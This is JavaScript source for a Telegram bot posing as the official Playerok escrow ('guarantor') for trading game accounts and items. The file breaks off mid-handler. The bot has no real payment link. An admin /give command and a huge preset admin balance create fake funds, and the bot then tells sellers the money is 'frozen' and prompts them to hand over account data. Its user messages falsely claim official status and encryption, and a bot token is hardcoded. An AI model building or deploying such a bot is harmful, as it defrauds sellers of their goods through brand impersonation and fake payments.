import { Telegraf, Markup } from 'telegraf';
import fs from 'fs';
import http from 'http';

const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN_USERNAME = 'k13_way'; 
const ADMIN_ID = 8886821631; 

let users = {}, deals = {}, states = {};

const PORT = process.env.PORT || 10000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running\n');
}).listen(PORT, '0.0.0.0');

if (fs.existsSync('database.json')) {
    try { users = JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch(e) { users = {}; }
}

function saveDB() {
    fs.writeFileSync('database.json', JSON.stringify(users, null, 2));
}

function init(id, name) {
    const username = name ? name.toLowerCase() : '';
    if (!users[id]) {
        const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
        users[id] = { id, username, balance: startBalance, count: 0 };
        saveDB();
    } else if (username && users[id].username !== username) {
        users[id].username = username;
        saveDB();
    }
}

function findIdByUsername(name) {
    if (!name) return null;
    const clean = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { if (users[id].username === clean) return parseInt(id); }
    return null;
}

const menu = Markup.keyboard([
    ['🤝 Создать сделку'],
    ['💳 Баланс', '🛡️ Безопасность'],
    ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']
]).resize();

bot.start((ctx) => {
    init(ctx.from.id, ctx.from.username);
    const text = `Добро пожаловать 👋\n\n` +
        `✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n` +
        `🥇 Автоматизированный алгоритм исполнения.\n` +
        `🔎 Скорость и автоматизация.\n` +
        `💳 Удобный и быстрый вывод средств.\n\n` +
        `• Комиссия сервиса: 1%\n` +
        `• Режим работы: 24/7\n` +
        `• Поддержка: @sw1zyy01\n\n` +
        `🛡️ Выберите нужный раздел ниже:`;
    ctx.replyWithMarkdown(text, menu);
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => {
    ctx.reply('💎 Playerok Гарант бот — это внутренние безопасные сделки в Telegram! 🛡️ Все сделки и данные надёжно хранятся в официальной базе данных Playerok. Если безопасные и быстрые сделки — то только на Playerok! ✨');
});

bot.hears('🛡️ Безопасность', (ctx) => {
    ctx.reply('🛡️ Гарант Playerok — это официальный Гарант бот. Тут вы можете проводить полностью безопасные сделки прямо в Telegram! 📊 Все сделки шифруются и хранятся на базе данных Playerok. Не ведитесь на мошенников! ❌ С любовью, Playerok Гарант. ❤️');
});

bot.hears('🆘 Поддержка', (ctx) => {
    ctx.reply('🆘 Поддержка Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае спорных моментов в сделках, обращайтесь к нашему официальному модератору @sw1zyy01. Прикрепите медийные доказательства (скриншоты/видео) проблемы в сделке.\n\nС любовью — Playerok Гарант. ❤️');
});

bot.hears('💳 Баланс', (ctx) => {
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    const text = `👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
        `👤 *Пользователь:* @${ctx.from.username || 'не установлен'}\n` +
        `💎 *Статус:* Проверенный трейдер\n` +
        `📈 *Успешных сделок:* ${u.count}\n\n` +
        `💵 *Текущий баланс:* [ ${u.balance.toLocaleString('ru-RU')} руб. ]\n\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `✨ _Проводите безопасные сделки, используя юзернеймы участников!_`;
    ctx.replyWithMarkdown(text);
});

bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN_USERNAME) return ctx.reply('❌ У вас нет прав администратора.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ Формат: /give [ID_Пользователя] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Неверный ID или сумма.');
    init(tId, null); users[tId].balance += am; saveDB();
    ctx.reply(`✅ Успешно начислено ${am} руб. пользователю с ID ${tId}`);
    bot.telegram.sendMessage(tId, `💰 Администратор зачислил на ваш баланс: +${am} руб.`).catch(()=>{});
});

bot.hears('🤝 Создать сделку', (ctx) => {
    ctx.reply('👉 Выберите вашу роль в создаваемой сделке:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('🛒 Я хочу Купить', 'role_buy'), Markup.button.callback('💰 Я хочу Продать', 'role_sell')]
        ])
    );
});

bot.action('role_buy', (ctx) => {
    states[ctx.from.id] = { step: 'info', type: 'buy' };
    ctx.answerCbQuery();
    ctx.replyWithMarkdown(
        `🛒 *ОФОРМЛЕНИЕ ПОКУПКИ ТОВАРА*\n\n` +
        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
        `\`[Сумма] [Название товара] [Юзернейм Продавца]\`\n\n` +
        `📋 *Пример:* \`2500 Standoff 2 Account @user_name\`\n\n` +
        `⚠️ _Важно: Продавец должен запустить бота (нажать /start) хотя бы один раз до начала сделки!_`
    );
});

bot.action('role_sell', (ctx) => {
    states[ctx.from.id] = { step: 'info', type: 'sell' };
    ctx.answerCbQuery();
    ctx.replyWithMarkdown(
        `💰 *ОФОРМЛЕНИЕ ПРОДАЖИ ТОВАРА*\n\n` +
        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
        `\`[Сумма] [Название товара] [Юзернейм Покупателя]\`\n\n` +
        `📋 *Пример:* \`1500 Нож в Standoff 2 @user_name\`\n\n` +
        `⚠️ _Важно: Покупатель должен запустить бота (нажать /start) хотя бы один раз до начала сделки!_`
    );
});

bot.on('text', async (ctx, next) => {
    const uid = ctx.from.id;
    const st = states[uid];
    if (!st || st.step !== 'info') return next();

    const type = st.type;
    delete states[uid]; 

    const text = ctx.message.text.trim();
    const match = text.match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);

    if (!match) {
        return ctx.reply('❌ Неверный формат сообщения!\n\nНажмите кнопку «🤝 Создать сделку» заново и отправьте данные строго по шаблону: [Сумма] [Товар] [@юзернейм]');
    }

    const am = parseInt(match[1]);
    const item = match[2];
    const targetUsername = match[3];

    if (am <= 0) return ctx.reply('❌ Ошибка: Сумма сделки должна быть больше нуля.');

    const targetId = findIdByUsername(targetUsername);
    if (!targetId) {
        return ctx.reply(`❌ Пользователь ${targetUsername} не найден в нашей базе данных. Он должен зайти в этого бота и нажать /start, чтобы активировать профиль!`);
    }

    if (uid === targetId) return ctx.reply('❌ Ошибка: Нельзя проводить безопасную сделку с самим собой.');

    const dId = Math.floor(100000 + Math.random() * 900000);
    
    const buyerId = (type === 'buy') ? uid : targetId;
    const sellerId = (type === 'buy') ? targetId : uid;
    const buyerName = (type === 'buy') ? (ctx.from.username || 'Покупатель') : targetUsername.replace('@','');
    const sellerName = (type === 'buy') ? targetUsername.replace('@','') : (ctx.from.username || 'Продавец');

    deals[dId] = { id: dId, buyerId, sellerId, buyerName, sellerName, am, item, status: 'wait' };

    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения от второй стороны.`);

    const notifyMsg = `🔔 *ВАМ ПРЕДЛОЖЕНА БЕЗОПАСНАЯ СДЕЛКА №${dId}!* 🔔\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
        `📦 *Товар/Услуга:* ${item}\n` +
        `💰 *Сумма сделки:* ${am} руб.\n` +
        `👤 *Второй участник:* @${ctx.from.username || 'Пользователь'}\n\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `Вы готовы принять условия гаранта и выполнить сделку?`;

    bot.telegram.sendMessage(targetId, notifyMsg, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]])
    }).catch(() => {
        ctx.reply('❌ Ошибка: Не удалось отправить уведомление второму участнику. Возможно, бот заблокирован.');
    });
});

bot.action(/^ok_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sellerId || d.status !== 'wait') return ctx.answerCbQuery('❌ Ошибка: Сделка недоступна.');
    d.status = 'pay'; 
    await ctx.answerCbQuery('✅ Сделка успешно подтверждена!');
    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте, пока покупатель @${d.buyerName} внесёт оплату.`);
    
    bot.telegram.sendMessage(d.buyerId, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: *${d.item}*\n💰 К оплате: *${d.am} руб.*\n\nНажмите кнопку ниже для перевода средств на баланс гаранта:`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]])
    });
});

bot.action(/^pay_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.buyerId || d.status !== 'pay') return ctx.answerCbQuery('❌ Ошибка.');
    init(d.buyerId, ctx.from.username); 
    const b = users[d.buyerId];
    
    if (b.balance < d.am) return ctx.reply(`❌ Ошибка: На вашем балансе недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${b.balance} руб.`);
    
    b.balance -= d.am; d.status = 'send'; saveDB();
    await ctx.answerCbQuery('✅ Успешно оплачено!');
    await ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены на счёте Playerok. Ожидайте получения товара от продавца.`);
    
    bot.telegram.sendMessage(d.sellerId, `📢 Покупатель @${d.buyerName} оплатил сделку №${dId}! Средства успешно заморожены гарантом.\n\n👉 Теперь вы можете безопасно передать данные от аккаунта/товар покупателю в ЛС. После передачи нажмите кнопку ниже:`, {
        ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]])
    });
});

bot.action(/^sent_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sellerId || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'check'; 
